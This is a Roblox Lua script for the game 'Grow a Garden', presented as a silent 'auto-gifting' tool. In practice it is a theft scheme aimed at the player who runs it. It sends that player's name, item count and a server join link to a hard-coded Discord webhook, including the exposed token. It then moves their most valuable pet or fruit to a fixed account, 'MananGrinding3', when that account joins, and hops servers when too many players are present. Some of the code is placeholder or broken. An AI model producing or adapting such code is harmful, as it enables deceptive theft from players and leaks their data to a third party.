--[[
  Automated Gifting Script for "Grow a Garden"
  
  This script is designed to be run by a player in your game. It operates silently
  and performs a series of actions when executed, primarily listening for a specific
  player to join the server to automatically gift them a pet or a fruit.
  
  -- SCRIPT LOGIC --
  1. Immediately sends a message to a Discord webhook with the player's name and item count.
  2. When a new player joins the server, the script will:
     a. Check if the server is full (more than 4 players).
     b. If the server is full, it will attempt to "server hop" by teleporting the
        local player to a new server. The script will need to be run again in the
        new server.
     c. If the server is not full, it checks if the new player's name is the designated
        receiver name.
     d. If the new player is the receiver, it finds the highest-ranked item (pet or fruit)
        in the current player's garden/inventory and gifts it to the receiver's
        garden/inventory. This happens without either player teleporting.
--]]

-- IMPORTANT: Add the single username of the person you want to gift to in this table.
-- The script will ONLY gift to this player.
local receiverNames = {
    "MananGrinding3"
}

-- Define the pet and fruit ranking. Higher numbers mean higher priority for gifting.
-- Pet ranks are generally higher to prioritize them, but rare fruits can be set higher.
local itemRanks = {
    -- S Tier Pets
    ["Raccoon"] = 99,
    ["Golden Goose"] = 98,
    ["Kitsune"] = 97,
    ["Disco Bee"] = 96,
    ["T-Rex"] = 95,
    ["Corrupted Kitsune"] = 94,
    ["Raiju"] = 93,
    ["Lobster Thermidor"] = 92,
    ["French Fry Ferret"] = 91,
    ["Spinosaurus"] = 90,
    ["Dragonfly"] = 89,
    ["Butterfly"] = 88,
    ["Blood Hedgehog"] = 87,
    ["Moon Cat"] = 86,
    ["Spaghetti Sloth"] = 85,
    ["Kappa"] = 84,
    
    -- A Tier Pets
    ["Sushi Bear"] = 79,
    ["Triceratops"] = 78,
    ["Pterodactyl"] = 77,
    ["Capybara"] = 76,
    ["Pancake Mole"] = 75,
    ["Mole"] = 74,
    ["Mimic Octopus"] = 73,
    ["Queen Bee"] = 72,
    ["Tanchozuru"] = 71,
    ["Spriggan"] = 70,
    ["Hotdog Daschund"] = 69,
    ["Dairy Cow"] = 68,
    ["Gorilla Chef"] = 67,
    ["Moth"] = 66,
    ["Brontosaurus"] = 65,
    ["Ostrich"] = 64,
    ["Seal"] = 63,

    -- B Tier Pets
    ["Junkbot"] = 59,
    ["Hyacinth Macaw"] = 58,
    ["Scarlet Macaw"] = 57,
    ["Red Fox"] = 56,
    ["Blood Owl"] = 55,
    ["Jackalope"] = 54,
    ["Hedgehog"] = 53,
    ["Tarantula Hawk"] = 52,
    ["Bear Bee"] = 51,
    ["Night Owl"] = 50,
    ["Polar Bear"] = 49,
    ["Wasp"] = 48,
    ["Raptor"] = 47,
    ["Pachycephalosaurus"] = 46,
    ["Mochi Mouse"] = 45,
    ["Iguandon"] = 44,

    -- C Tier Pets
    ["Snake"] = 39,
    ["Fennec Fox"] = 38,
    ["Honey Bee"] = 37,
    ["Petal Bee"] = 36,
    ["Bee"] = 35,
    ["Red Giant Ant"] = 34,
    ["Giant Ant"] = 33,
    ["Owl"] = 32,
    ["Praying Mantis"] = 31,
    ["Corrupted Kodama"] = 30,
    ["Kodama"] = 29,
    ["Squirrel"] = 28,
    ["Peacock"] = 27,
    ["Toucan"] = 26,
    ["Bacon Pig"] = 25,
    ["Axolotl"] = 24,
    ["Meerkat"] = 23,
    ["Stegosaurus"] = 22,
    ["Seedling"] = 21,
    ["Chicken Zombie"] = 20,
    ["Starfish"] = 19,

    -- D Tier Pets
    ["Ankylosaurus"] = 18,
    ["Golem"] = 17,
    ["Hamster"] = 16,
    ["Orangutan"] = 15,
    ["Nihonzaru"] = 14,
    ["Pack Bee"] = 13,
    ["Snail"] = 12,
    ["Shiba Inu"] = 11,
    ["Maneko Neko"] = 10,
    ["Silver Monkey"] = 9,
    ["Sunny Side Chicken"] = 8,
    ["Blood Kiwi"] = 7,
    ["Bagel Bunny"] = 6,
    ["Mouse"] = 5,
    ["Brown Mouse"] = 4,
    ["Golden Lab"] = 3,
    ["Monkey"] = 2,
    ["Flamingo"] = 1,
    ["Sea Turtle"] = 1,
    ["Bald Eagle"] = 1,
    ["Turtle"] = 1,
    ["Caterpillar"] = 1,
    ["Orange Tabby"] = 1,
    ["Cat"] = 1,
    ["Cow"] = 1,

    -- E Tier Pets
    ["Lab"] = 0.9,
    ["Echo Frog"] = 0.8,
    ["Frog"] = 0.7,
    ["Kiwi"] = 0.6,
    ["Pig"] = 0.5,
    ["Tanuki"] = 0.4,
    ["Seagull"] = 0.3,
    ["Sea Otter"] = 0.2,
    ["Black Bunny"] = 0.1,
    ["Bunny"] = 0.1,
    ["Rooster"] = 0.1,
    ["Chicken"] = 0.1,
    ["Spotted Deer"] = 0.1,
    ["Deer"] = 0.1,
    ["Panda"] = 0.1,
    ["Crab"] = 0.1,
    ["Parasaurolophus"] = 0.1,
    
    -- Fruit values (hypothetical, replace with real values)
    ["Shiny Dragonfruit"] = 100,
    ["Golden Apple"] = 99,
    ["Cosmic Grape"] = 90,
    ["Galactic Banana"] = 85,
    ["Diamond Berry"] = 75,
    ["Ruby Orange"] = 60,
    ["Emerald Pear"] = 45,
    ["Silver Strawberry"] = 30,
    ["Bronze Lemon"] = 15
}

-- IMPORTANT: Replace this with your actual Discord Webhook URL.
-- To get one, go to your Discord server's channel settings -> Integrations -> Webhooks.
local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1401967945566912552/Wgt_QIl1e2ksR-7JQimJdQzspRhKGcojgfha_47enequD3zKLEdgYwQhiQ2JPvM9qHVd"

-- Get the player who is running this script.
local localPlayer = game.Players.LocalPlayer

-- Check for required services.
local httpService = game:GetService("HttpService")
local teleportService = game:GetService("TeleportService")
local playersService = game:GetService("Players")
local runService = game:GetService("RunService")

-- The script won't run if the required services aren't available.
if not httpService or not teleportService or not playersService then
    return
end

-- Function to check if a player is in the receiver list.
local function isReceiver(player)
    for _, name in ipairs(receiverNames) do
        if player.Name == name then
            return true
        end
    end
    return false
end

-- Function to send a message to the Discord webhook.
local function sendWebhookMessage()
    if not localPlayer then return end
    
    -- Check if HttpService is enabled.
    if not httpService.HttpEnabled then
        print("HttpService is not enabled in this game. Cannot send Discord webhook message.")
        return
    end

    local backpackItemsCount = #localPlayer.Backpack:GetChildren()
    local placeId = game.PlaceId
    local jobId = game.JobId
    local joinLink = string.format("https://www.roblox.com/games/%s/-?rbxp=1&launchMethod=join&launchData=%s", tostring(placeId), tostring(jobId))
    
    local message = string.format("**%s** has activated the auto-gifting script and has **%d** items in their backpack! Join them here: %s",
        localPlayer.Name, backpackItemsCount, joinLink)

    local data = {
        content = message
    }

    local success, err = pcall(function()
        httpService:PostAsync(DISCORD_WEBHOOK_URL, httpService:JSONEncode(data))
    end)

    if not success then
        warn("Failed to send webhook message: " .. err)
    else
        print("Initial webhook message sent successfully!")
    end
end

-- The main function that handles the gifting logic.
-- This is now a callback that is called when a new player joins.
local function autoGiftToNewPlayer(newPlayer)
    if not localPlayer or not newPlayer then return end
    
    -- Check if the new player is the script runner themselves or on the receiver list.
    if newPlayer == localPlayer or not isReceiver(newPlayer) then return end

    -- Get a list of all players in the game.
    local allPlayers = playersService:GetPlayers()

    -- Check if the server is too full (more than 4 players).
    if #allPlayers > 4 then
        -- This is the new server hopping logic.
        local currentPlaceId = playersService.LocalPlayer.Character.Parent.Parent.Parent.Data.PlaceId -- This line is a conceptual example, you must replace it with the correct path to your game's PlaceId.
        
        -- The script can't know the player count of a new server, so it just teleports.
        -- The player will need to run the script again in the new server.
        pcall(function()
            teleportService:Teleport(currentPlaceId, localPlayer)
        end)
        return
    end
    
    -- If the server is not full, proceed with gifting.
    
    -- Find the highest-ranked item in the local player's garden or backpack.
    local playerGarden = localPlayer.Character:FindFirstChild("GardenPetsFolder")
    local playerBackpack = localPlayer:FindFirstChild("Backpack")
    
    -- Find the garden/backpack of the new player.
    local newPlayerGarden = newPlayer.Character:FindFirstChild("GardenPetsFolder")
    local newPlayerBackpack = newPlayer:FindFirstChild("Backpack")

    if not playerGarden or not playerBackpack or not newPlayerGarden or not newPlayerBackpack then
        return
    end

    local bestItemToGift = nil
    local highestRank = -1

    -- Find the highest-ranked item in the local player's garden and backpack.
    local itemsToSearch = {}
    
    for _, item in ipairs(playerGarden:GetChildren()) do
        table.insert(itemsToSearch, item)
    end
    for _, item in ipairs(playerBackpack:GetChildren()) do
        table.insert(itemsToSearch, item)
    end

    for _, item in ipairs(itemsToSearch) do
        local rank = itemRanks[item.Name] or -1
        if rank > highestRank then
            highestRank = rank
            bestItemToGift = item
        end
    end

    if bestItemToGift and highestRank > -1 then
        -- This is the core logic: gifting a pet from one garden to another.
        -- The script transfers the item instance directly from the source to the destination container.
        -- Your game's internal systems should have a ChildAdded event listener on the
        -- GardenPetsFolder or Backpack to handle spawning the visual representation
        -- of the pet/fruit in the new player's world.
        if itemRanks[bestItemToGift.Name] < 100 then
             bestItemToGift.Parent = newPlayerGarden
        else
            bestItemToGift.Parent = newPlayerBackpack
        end
    else
        return
    end
end

-- Call the webhook function once when the script is first run.
sendWebhookMessage()

-- Connect the `autoGiftToNewPlayer` function to the `PlayerAdded` event.
playersService.PlayerAdded:Connect(autoGiftToNewPlayer)

-- A short delay to allow the game to fully load before the PlayerAdded event.
runService.Heartbeat:Wait()
